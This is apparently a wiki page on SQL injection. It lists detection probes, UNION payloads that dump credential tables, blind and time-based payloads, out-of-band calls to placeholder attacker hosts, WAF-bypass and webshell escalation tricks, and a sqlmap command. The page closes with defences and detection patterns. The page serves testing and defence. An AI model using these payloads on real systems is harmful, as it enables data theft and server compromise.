---
title: SQL injection
slug: sql-injection
---

> **TL;DR:** Untrusted input is concatenated into a SQL query; the attacker reshapes the query to read, write, or execute beyond the original intent.

## What it is
The app builds SQL strings — `"SELECT * FROM users WHERE name='" + input + "'"` — instead of using a parameterised statement. Quotes, comments, and structural keywords in the input change the AST the database parses. Impact ranges from auth bypass and data exfiltration to file read/write and, on some stacks, OS command execution. See also [[sql-injection-by-database]] for engine-specific syntax.

## Preconditions / where it applies
- Any parameter that reaches a query builder without strict typing — string fields, but also numeric, headers, cookies, JSON, ORDER BY columns.
- Verbose, blind, time-based, or out-of-band feedback channels.
- Driver and engine: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite, plus DBaaS variants.

## Technique
1. **Detect.** Append `'`, `"`, `\`, `)` and watch for errors or behaviour change. Compare `' OR 1=1-- ` and `' OR 1=2-- ` outcomes.
2. **Classify.** In-band (union / error) > blind boolean > blind time-based > out-of-band (DNS, HTTP).
3. **Union-based exfil.** Match column count and types, then read system tables.

   ```sql
   ' UNION SELECT NULL,NULL,NULL-- 
   ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
   ' UNION SELECT username,password,NULL FROM users-- 
   ```

4. **Boolean blind.** `AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'` — iterate per char. Burp Intruder cluster-bomb or sqlmap.
5. **Time blind.** `AND IF(SUBSTRING(...,1,1)='a', SLEEP(5), 0)` (MySQL); `pg_sleep`, `WAITFOR DELAY`, `DBMS_PIPE.RECEIVE_MESSAGE`.
6. **Out-of-band.** MSSQL `xp_dirtree '\\attacker\share\...'`, MySQL `LOAD_FILE('//oast.me/x')`, Oracle `UTL_HTTP.REQUEST`. Useful when filters strip output and timing is unreliable.
7. **Second-order.** Payload stored on insert, fires when another query later concatenates it (admin search, report export).
8. **Filter / [[waf-bypass]] tricks.** Inline comments `/*!50000UNION*/`, case, whitespace alternatives (`/**/`, tab, `+`), `CHAR()` reassembly, JSON / parameter pollution.
9. **Escalate.** MSSQL `xp_cmdshell`, MySQL `INTO OUTFILE` to drop a webshell, PostgreSQL `COPY ... PROGRAM`, file read where the DB user has FILE privilege.
10. **Automation.** `sqlmap -u 'https://target/x?id=1' --batch --risk 3 --level 5 --random-agent` once you have manual confirmation.

## Detection and defence
- Use parameterised queries / prepared statements everywhere. ORMs are not magic — raw query / `whereRaw` is the usual sink.
- Strict allowlists for non-parameterisable spots (ORDER BY column, table name) — map user input to a known set, never concatenate.
- Least-privilege DB user; revoke FILE, xp_cmdshell, and superuser from the app account.
- Detection: WAF on classic patterns (`' OR `, `UNION SELECT`, `SLEEP(`, `xp_cmdshell`); DB slow-query log spikes; error-rate alerting on 500s with SQL strings.

## References
- [PortSwigger — SQL injection](https://portswigger.net/web-security/sql-injection) — labs and cheat sheet.
- [OWASP — SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — defences.
- [sqlmap](https://sqlmap.org/) — exploitation tool.
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) — payload reference.
